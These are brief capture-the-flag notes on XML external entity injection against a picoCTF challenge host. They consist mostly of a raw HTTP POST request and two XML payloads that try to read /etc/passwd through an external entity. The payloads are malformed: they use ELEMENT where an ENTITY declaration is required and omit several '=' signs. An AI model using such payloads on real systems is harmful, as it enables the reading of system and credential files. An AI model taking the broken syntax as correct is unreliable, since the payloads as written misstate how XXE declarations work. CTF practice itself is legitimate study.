xxe (XML eXternal Entity Injection)
	--> find a function that"POST"and action  --> 
		e.g <form class"detailForm" action="/data? method="POST">
		
	POST /data HTTP/1.1
	Host: saturn.picoctf.net:53951
	Accept: text/plain, */*; q=0.01
	content-type :text/xml
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	<?xml version"1.0" encoding="utf-8"?>
	<!DOCTYPE data [
	<!ELEMENT name ANY>
	<!ELEMENT xxe SYSTEM "file:///etc/passwd">]>
	<root>
	<name>&xxe;</name>
	</root>
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> F12 --> Network --> data --> payload
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	<?xml version"1.0" encoding="utf-8"?>
	<!DOCTYPE data [
	<!ELEMENT file SYSTEM "file:///etc/passwd">]>
	<data>
	<ID>&file;</ID>
	</data>
	



